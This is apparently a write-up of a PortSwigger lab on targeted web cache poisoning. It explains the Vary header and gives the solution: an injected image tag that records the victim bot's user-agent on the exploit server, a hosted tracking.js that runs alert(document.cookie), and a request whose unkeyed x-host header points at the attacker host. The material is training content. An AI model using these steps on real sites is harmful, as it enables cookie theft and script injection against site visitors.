# [Lab: Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

## Lab

This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

## Vary header

The rudimentary way that the `Vary` header is often used can also provide attackers with a helping hand. The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed. It is commonly used to specify that the `User-Agent` header is keyed, for example, so that if the mobile version of a website is cached, this won't be served to non-mobile users by mistake.

This information can also be used to construct a multi-step attack to target a specific subset of users. For example, if the attacker knows that the `User-Agent` header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected. Alternatively, they could work out which user agent was most commonly used to access the site, and tailor the attack to affect the maximum number of users that way.

## Scan

Param Miner extension results: `x-host` is an unkeyed header.

## Solutions

upload a comment to any post: `<img src="https://exploit-id.exploit-server.net/log">`, observe the log to know the bot's user-agent.

craft response at exploit-server:

- file: `/resources/js/tracking.js`
- body: `alert(document.cookie)`

cache poisoning:

```http
GET / HTTP/1.1
Host: id.web-security-academy.net
User-Agent: observed-user-agent-of-bot
x-host: exploit-id.exploit-server.net
```
